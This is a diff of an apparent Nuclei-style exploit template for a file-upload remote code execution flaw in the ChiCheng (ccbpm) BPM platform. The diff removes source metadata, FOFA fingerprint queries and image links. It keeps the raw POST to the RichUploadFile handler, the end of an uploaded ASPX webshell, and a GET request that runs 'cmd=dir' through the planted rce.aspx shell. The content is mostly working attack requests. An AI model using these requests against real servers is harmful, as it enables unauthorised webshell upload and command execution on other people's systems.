@@ -3,12 +3,8 @@ info:
   name: 驰骋BPM低代码开发平台 RichUploadFile 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mcymfg1dx3akaa5r'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mcymfg1dx3akaa5r
-    fofa: body="/WF/AppClassic/Home.htm" || body="ccbpm" || body="/DataUser/Icon/LogBig.png"
 http:
 - raw:
   - 'POST /WF/Comm/Handler.ashx?DoType=HttpHandler&DoMethod=RichUploadFile&HttpHandlerName=BP.WF.HttpHandler.WF_Comm_Sys&Directory=Mazi HTTP/1.1
@@ -67,18 +63,14 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498952860-2c8b47cc-4562-46db-8b85-148fb1a87bc1.png)'
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
   redirects: false
   matchers:
   - status:
     - 200
     type: status
 - raw:
-  - 'GET /DataUser/RichTextFile/Mazi/rce.aspx?cmd=dir HTTP/1.1
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1753498953038-30eb7c22-dde8-46ef-b52d-6fa18bb15838.png)'
+  - GET /DataUser/RichTextFile/Mazi/rce.aspx?cmd=dir HTTP/1.1
   redirects: false
   matchers:
   - status:
